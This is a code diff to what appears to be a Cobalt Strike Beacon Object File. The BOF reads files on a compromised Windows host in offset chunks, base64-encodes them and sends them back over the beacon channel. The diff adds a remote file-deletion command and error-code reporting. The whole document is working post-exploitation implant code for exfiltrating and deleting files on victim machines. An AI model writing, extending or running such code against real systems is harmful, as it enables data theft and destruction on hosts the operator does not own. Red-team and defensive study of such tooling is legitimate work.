@@ -1,6 +1,9 @@
 #include <windows.h>
 #include "beacon.h"
  
+
+DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DeleteFileW(LPCWSTR);
 DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
@@ -8,6 +11,22 @@ DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);
 DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
 DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptBinaryToStringA(LPVOID, DWORD, DWORD, LPSTR, LPDWORD);
+
+void delete(char * args, unsigned long alen) {
+    datap  parser;
+    BeaconDataParse(&parser, args, alen);
+
+    wchar_t* fileName = (wchar_t*)BeaconDataExtract(&parser, NULL);
+    DWORD rplyid = BeaconDataInt(&parser);
+
+    if( FALSE == KERNEL32$DeleteFileW(fileName)){
+        BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] DELETE! Err: %d\n", rplyid, KERNEL32$GetLastError());
+        return;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[OK][%d] DELETE", rplyid);
+
+}
 
 void go(char * args, unsigned long alen) {
     datap  parser;
@@ -28,26 +47,26 @@ void go(char * args, unsigned long alen) {
     
     hFile = KERNEL32$CreateFileW(fileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
     if(hFile == INVALID_HANDLE_VALUE){
-        BeaconPrintf(CALLBACK_OUTPUT, "[FAIL][%d] OPEN FILE\n", rplyid);
+        BeaconPrintf(CALLBACK_OUTPUT, "[FAIL][%d] OPEN FILE! Err: %d\n", rplyid, KERNEL32$GetLastError());
         return;
     }
     BeaconPrintf(CALLBACK_OUTPUT,"[INFO][%d] OPEN OK!\n");
 
     if( INVALID_SET_FILE_POINTER == KERNEL32$SetFilePointer(hFile, seekSize, &seekResSize, 0)) {
-        BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] SEEK\n", rplyid);
+        BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] SEEK! Err: %d\n", rplyid, KERNEL32$GetLastError());
         KERNEL32$CloseHandle(hFile);
         return;
     }
 
     LPVOID ReadBuffer = KERNEL32$VirtualAlloc(NULL, buffsize, MEM_COMMIT, PAGE_READWRITE);
     if(NULL == ReadBuffer){
-         BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] ALLOC\n", rplyid);
+         BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] ALLOC! Err: %d\n", rplyid, KERNEL32$GetLastError());
          return;
     }
 
 
     if( FALSE == KERNEL32$ReadFile(hFile, ReadBuffer, buffsize, &readSize, NULL) ){
-        BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] READ\n", rplyid);
+        BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] READ! Err: %d\n", rplyid, KERNEL32$GetLastError());
         KERNEL32$CloseHandle(hFile);
         KERNEL32$VirtualFree(ReadBuffer, 0, MEM_RELEASE);
         return;
@@ -61,7 +80,7 @@ void go(char * args, unsigned long alen) {
         DWORD convBuffSize = (readSize*2) + 1;
         LPVOID ReadBufferHex = KERNEL32$VirtualAlloc(NULL, convBuffSize, MEM_COMMIT, PAGE_READWRITE);
         if( FALSE == CRYPT32$CryptBinaryToStringA(ReadBuffer, readSize, CRYPT_STRING_BASE64, ReadBufferHex, &convBuffSize)){
-            BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] ENCODE\n", rplyid);
+            BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] ENCODE! Err: %d\n", rplyid, KERNEL32$GetLastError());
             KERNEL32$VirtualFree(ReadBuffer, 0, MEM_RELEASE);
             return;
         }
